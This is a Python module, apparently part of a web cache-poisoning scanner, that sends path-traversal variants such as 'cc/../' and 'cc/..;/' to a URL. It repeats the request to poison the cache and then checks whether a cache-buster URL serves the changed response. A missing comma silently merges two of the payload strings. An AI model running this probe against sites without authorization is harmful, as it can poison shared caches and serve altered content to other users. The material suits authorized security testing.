#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
From 0xrth research
"""


from utils.utils import random, requests, configure_logger, cache_tag_verify, CONTENT_DELTA_RANGE
from utils.style import Identify, Colors
import traceback
try:
    import httpx
except:
    print("httpx does not seem to be installed")

logger = configure_logger(__name__)

VULN_NAME = "Path Traversal"


def verify(req_main, url, url_cb, url_test, completed_path, range_exlusion, p, s):
    try:
        completed_path = completed_path.encode("utf-8")
        url_with_raw_path = f"{url}{completed_path.decode('utf-8')}" if url[-1] == "/" else f"{url}/{completed_path.decode('utf-8')}"
        #print(url_with_raw_path)
        #print(url_with_raw_path)
        for _ in range(5):
            with httpx.Client(http2=False, verify=False) as client:
                req_verify = client.get(url_with_raw_path)

        req_cb = s.get(url_cb, verify=False, timeout=10, allow_redirects=False)
        #print(f"req_cb.status_code: {req_cb.status_code} | req_verify.status_code: {req_verify.status_code} | req_main.status_code: {req_main.status_code}")
        cache_status = cache_tag_verify(req_cb)
        if req_cb.status_code == req_verify.status_code and req_cb.status_code != req_main.status_code and req_cb.status_code not in [403, 401, 429]:
            print(f" {Identify.confirmed} | {VULN_NAME} {req_main.status_code} > {req_cb.status_code} | CACHETAG : {cache_status} | \033[34m{url_cb}\033[0m | PAYLOAD: {Colors.THISTLE}{url_test}{Colors.RESET}")
        elif len(req_cb.content) not in range_exlusion and req_cb.status_code not in [403, 401, 429]:
            print(f" {Identify.confirmed} | {VULN_NAME} {len(req_main.content)}b > {len(req_cb.content)}b | CACHETAG : {cache_status} | \033[34m{url_cb}\033[0m | PAYLOAD: {Colors.THISTLE}{url_test}{Colors.RESET}")
    except requests.Timeout:
        #print(f"request timeout {url} {p}")
        pass
    except Exception as e:
        #traceback.print_exc()
        pass



def path_traversal_check(url, s, req_main, authent):
    try:
        range_exlusion = range(len(req_main.content) - CONTENT_DELTA_RANGE, len(req_main.content) + CONTENT_DELTA_RANGE)
        paths = [
        "\\",
        "cc\\..\\",
        "cc/../",
        "cc/%2e%2e%2f"
        "cc%2e%2e/",
        "cc%2f..%2f",
        "cc/..\\",
        "cc/..;/",
        ]
        for p in paths:
            cb = f"?cb={random.randrange(999)}"

            completed_path = f"{p}{cb}"
            url_test = f"{url}{completed_path}" if url[-1] == "/" else f"{url}/{completed_path}"
            url_cb = f"{url}{cb}"

            req_test = s.get(url_test, verify=False, timeout=10, allow_redirects=False)
            if req_test.status_code != req_main.status_code and req_test.status_code not in [403, 401, 429]:
                print(f" {Identify.behavior} | {VULN_NAME} {req_main.status_code} > {req_test.status_code} | \033[34m{url_cb}\033[0m | PAYLOAD: {Colors.THISTLE}{url_test}{Colors.RESET}")
                verify(req_main, url, url_cb, url_test, completed_path, range_exlusion, p, s)
            elif len(req_test.content) not in range_exlusion and req_test.status_code not in [403, 401, 429]:
                print(f" {Identify.behavior} | {VULN_NAME} {len(req_main.content)}b > {len(req_test.content)}b | \033[34m{url_cb}\033[0m | PAYLOAD: {Colors.THISTLE}{url_test}{Colors.RESET}")
                verify(req_main, url, url_cb, url_test, completed_path, range_exlusion, p, s)
    except requests.Timeout:
        #print(f"request timeout {url} {p}")
        pass
    except Exception as e:
        #traceback.print_exc()
        pass
